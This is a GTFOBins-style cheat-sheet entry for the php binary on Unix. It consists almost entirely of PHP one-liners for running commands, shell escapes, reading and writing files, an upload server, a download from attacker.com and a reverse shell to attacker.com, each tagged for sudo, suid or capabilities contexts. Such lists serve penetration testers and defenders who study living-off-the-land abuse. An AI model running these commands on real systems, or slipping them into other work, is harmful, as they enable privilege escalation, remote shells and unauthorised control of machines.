---
type: gtfobin
name: php
platform: Unix
functions: [command, download, file-read, file-write, reverse-shell, shell, upload]
tags: [gtfobin, unix, lotl]
---

# php

## command

```bash
php -r 'echo shell_exec("/path/to/command");'
```
**Contexts:** sudo, suid, unprivileged

```bash
php -r '$r=array(); exec("/path/to/command", $r); print(join("\n",$r));'
```
**Contexts:** sudo, suid, unprivileged

```bash
php -r '$p = array(array("pipe","r"),array("pipe","w"),array("pipe", "w"));$h = @proc_open("/path/to/command", $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'
```
**Contexts:** sudo, suid, unprivileged

## download

```bash
php -r '$c=file_get_contents("http://attacker.com/path/to/input-file"); file_put_contents("/path/to/output-file", $c);'
```
**Contexts:** sudo, suid, unprivileged

## file-read

```bash
php -r 'readfile("/path/to/input-file");'
```
**Contexts:** sudo, suid, unprivileged

## file-write

```bash
php -r 'file_put_contents("/path/to/output-file", "DATA");'
```
**Contexts:** sudo, suid, unprivileged

## reverse-shell

```bash
php -r '$sock=fsockopen("attacker.com",12345);exec("/bin/sh -i 0<&3 1>&3 2>&3");'
```
**Contexts:** sudo, suid, unprivileged

## shell

```bash
php -r 'system("/bin/sh -i");'
```
**Contexts:** capabilities, sudo, suid, unprivileged

```bash
php -r 'passthru("/bin/sh -i");'
```
**Contexts:** capabilities, sudo, suid, unprivileged

```bash
php -r '$h=@popen("/bin/sh -i","r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
```
**Contexts:** capabilities, sudo, suid, unprivileged

```bash
php -r 'pcntl_exec("/bin/sh");'
```
**Contexts:** capabilities, sudo, suid, unprivileged

## upload

```bash
php -S 0.0.0.0:80
```
**Contexts:** sudo, suid, unprivileged
